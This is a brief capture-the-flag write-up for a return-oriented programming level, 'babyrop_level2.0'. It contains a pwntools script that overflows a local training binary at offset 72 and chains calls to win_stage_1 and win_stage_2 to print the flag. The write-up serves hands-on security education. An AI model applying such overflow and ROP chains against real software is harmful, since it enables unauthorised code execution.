# Return Oriented Programming 2.0

Running the provided executable file, we are provided with the offset (72) and are tasked to jump to `win_stage_1`  then `win_stage_2`. We can use the `rop` function from `pwn` to simplify the payload.

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyrop_level2.0")

io = process()

print("===== STARTING EXPLOIT =====")

offset = 72

rop = ROP(elf)
rop.raw(b'A' * offset)
rop.win_stage_1()
rop.win_stage_2()

io.sendline(rop.chain())

io.recvuntil(b'Leaving!\n')
print(f'Flag: {io.recvline(False)}')
```

Flag:

![[Return Oriented Programming/images/Level2.0.png]]